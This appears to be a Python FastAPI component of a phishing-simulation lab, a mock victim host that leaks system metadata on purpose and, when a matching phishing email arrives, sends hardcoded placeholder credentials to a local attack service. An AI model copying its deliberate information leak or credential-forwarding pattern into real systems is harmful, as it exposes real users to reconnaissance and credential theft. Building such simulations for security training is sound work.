import os
import httpx
from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
import logging
from fastmcp import FastMCP

# --- Configuration for the Victim ---
# In a real scenario, this would be loaded from env vars or a config file
# specific to the container instance.
VICTIM_CONFIG = {
    "company_name": "Acme Corp",
    "username": "victim_user",
    "password": "Password123!",
    "attack_service_credential_harvest_url": os.getenv(
        "ATTACK_SERVICE_URL", "http://127.0.0.1:8001/mcp/"
    ) + "simulate_credential_harvest"
}

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- FastAPI App ---
app = FastAPI(
    title="Victim Host Agent (VHA)",
    description="Simulates a programmable victim host that can be targeted by attacks."
)

class PhishingEmail(BaseModel):
    company: str
    malicious_link: str # In this simulation, this link points back to the attack service
    email_body: str # The crafted content from the attack agent

@app.get("/metadata")
async def get_metadata():
    """
    暴露一些可供侦察的元数据，模拟一个配置不当或信息泄露的端点。
    """
    return {
        "company_name": VICTIM_CONFIG["company_name"],
        "system_info": "Ubuntu 20.04 LTS",
        "server": "Apache/2.4.41 (Ubuntu)",
        "open_ports": [22, 80, 443]
    }

@app.post("/receive_email")
async def receive_email(email: PhishingEmail):
    """
    Simulates receiving a phishing email. It checks if the email is 'relevant'
    (matches the company name) and, if so, 'clicks' the malicious link.
    """
    logger.info(f"Received phishing email targeting company: {email.company}")
    logger.info(f"Email body:\n{email.email_body}")

    if email.company == VICTIM_CONFIG["company_name"]:
        logger.warning(
            f"Vulnerability triggered! Email company '{email.company}' matches victim's company. "
            f"Simulating user clicking the malicious link: {email.malicious_link}"
        )
        try:
            attack_service = FastMCP.as_proxy("http://127.0.0.1:8001/mcp/")
            async with attack_service.client as client:
                await client.call_tool(
                    "simulate_credential_harvest",
                    arguments={
                        "username": VICTIM_CONFIG["username"],
                        "password": VICTIM_CONFIG["password"]
                    }
                )
            return {"status": "compromised", "detail": "Credentials sent to attacker."}

        except Exception as e:
            error_message = f"An unexpected error occurred during credential submission: {e}"
            logger.error(error_message)
            raise HTTPException(status_code=500, detail=error_message)

    else:
        logger.info("Email was not relevant. Ignoring.")
        return {"status": "ignored", "detail": "Email did not match victim criteria."}

if __name__ == "__main__":
    import uvicorn
    # This agent would run on a different port
    uvicorn.run(app, host="0.0.0.0", port=8005) 